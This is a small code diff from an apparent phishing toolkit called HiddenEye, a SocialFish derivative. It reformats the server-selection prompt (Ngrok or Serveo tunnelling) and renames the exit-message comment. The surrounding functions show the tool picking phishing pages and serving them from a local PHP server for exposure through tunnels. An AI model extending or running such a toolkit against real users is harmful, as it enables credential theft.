@@ -71,7 +71,9 @@ def runPhishing(page , customOption): #Phishing pages selection menu
 def selectServer(): #Question where user must select server
         print("\n {0}Please select any available server:{1}".format(RED, DEFAULT))
         print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(RED, DEFAULT))
-        choice = input(" \n{0}HiddenEye>>> {1}".format(RED, DEFAULT))
+
+        choice = input(" \n {0}HiddenEye >>> {1}".format(RED, DEFAULT))
+
         if choice == '1':
             runNgrok()
         elif choice == '2':
@@ -251,7 +253,7 @@ def inputCustom(): #Question where user can input custom web-link
 def runServer():
     system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
-def endMessage(): #Message when SocialFish exit
+def endMessage(): #Message when HiddenEye exit
     system('clear')
     print ('''
                      {1}_....~~~~=====~~~~...._
